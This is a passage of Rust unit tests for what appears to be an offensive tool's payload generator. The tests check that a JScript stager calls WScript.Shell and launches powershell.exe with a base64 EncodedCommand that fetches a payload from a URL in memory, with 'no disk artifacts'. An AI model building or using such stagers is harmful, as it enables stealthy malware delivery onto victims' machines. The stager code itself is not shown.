            if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(b64) {
                let ps: String = raw
                    .chunks(2)
                    .filter_map(|c| {
                        if c.len() == 2 {
                            Some(u16::from_le_bytes([c[0], c[1]]))
                        } else {
                            None
                        }
                    })
                    .filter_map(|v| char::from_u32(v as u32))
                    .collect();
                assert!(ps.contains(url), "PowerShell command must embed the URL");
            }
        }
    }

    #[test]
    fn test_jscript_stager_generation() {
        let url = "https://example.com/blob";
        let key = [0u8; 32];
        let stager = generate_jscript_stager(url, &key);

        // Stager must delegate to PowerShell in-memory (no disk artifacts)
        assert!(stager.contains("WScript.Shell"));
        assert!(stager.contains("powershell.exe"));
        assert!(stager.contains("EncodedCommand"));
        // Sanity: the encoded command embeds the URL — decode and verify
        let b64 = stager
            .split("EncodedCommand ")
            .nth(1)
            .unwrap_or("")
            .trim_end_matches('"')
            .trim_end_matches(")");
        if !b64.is_empty() {
            if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(b64) {
                let ps: String = raw
                    .chunks(2)
                    .filter_map(|c| {
                        if c.len() == 2 {
                            Some(u16::from_le_bytes([c[0], c[1]]))
                        } else {
                            None
                        }
                    })
                    .filter_map(|v| char::from_u32(v as u32))
                    .collect();
                assert!(ps.contains(url), "PowerShell command must embed the URL");
            }
        }
    }
}
